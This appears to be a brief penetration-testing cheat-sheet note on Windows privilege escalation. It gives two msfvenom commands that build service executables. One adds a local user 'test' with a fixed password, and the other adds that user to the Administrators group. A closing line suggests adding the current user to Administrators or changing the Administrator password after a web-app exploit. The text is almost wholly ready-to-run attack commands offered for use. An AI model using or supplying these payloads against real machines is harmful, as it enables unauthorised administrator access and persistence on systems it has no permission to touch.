Test this with an add user payload first
Remember to use exe-service payload as I seemed to have issues getting a standard exe payload to work

  msfvenom -p windows/adduser USER=test PASS=Easyas123! -f exe-service -o adduser.exe
  
Then:

  msfvenom -p windows/x64/exec CMD="cmd.exe /c 'net localgroup Administrators test /add'" -f exe-service -o admuser.exe

If we have limited access (e.g. through a web app exploit) then we'll have to add the current user to the Administrators group or change Administrator password
